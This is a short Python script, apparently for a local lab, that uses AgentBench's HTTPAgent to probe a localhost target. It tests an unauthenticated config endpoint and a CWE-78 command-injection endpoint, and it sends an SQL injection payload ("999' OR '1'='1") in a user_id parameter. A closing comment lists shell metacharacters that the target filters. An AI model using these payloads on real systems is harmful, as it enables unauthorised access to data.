import sys
sys.path.append("./src")

from client.agents.http_agent import HTTPAgent

if __name__ == "__main__":
    print("===== AgentBench 本地靶机自动化漏洞探测 =====\n")

    # 1. CS0048 未授权配置泄露漏洞
    print("【1】测试 CS0048 API未授权访问")
    agent_config = HTTPAgent(
        url="http://127.0.0.1:18789/api/v1/config",
        return_format="{response}"
    )
    res_config = agent_config.inference([])
    print("探测结果：", res_config)
    print("-" * 70)

    # 2. CWE-89 SQL注入漏洞
    print("【2】测试 CWE-89 SQL注入攻击")
    sql_payload = "999' OR '1'='1"
    sql_url = f"http://127.0.0.1:18789/api/v1/user?user_id={sql_payload}"
    agent_sql = HTTPAgent(
        url=sql_url,
        return_format="{response}"
    )
    res_sql = agent_sql.inference([])
    print("探测结果：", res_sql)
    print("-" * 70)

    # 3. CWE-78 命令注入漏洞（接口存在字符过滤，暂无法利用）
    print("【3】测试 CWE-78 系统命令注入")
    cmd_url = "http://127.0.0.1:18789/api/v1/ping?ip=127.0.0.1"
    agent_cmd = HTTPAgent(
        url=cmd_url,
        return_format="{response}"
    )
    res_cmd = agent_cmd.inference([])
    print("基础访问结果：", res_cmd)
    print("备注：靶机对 ; && | %0a 等特殊命令符做拦截过滤，常规载荷注入失败")
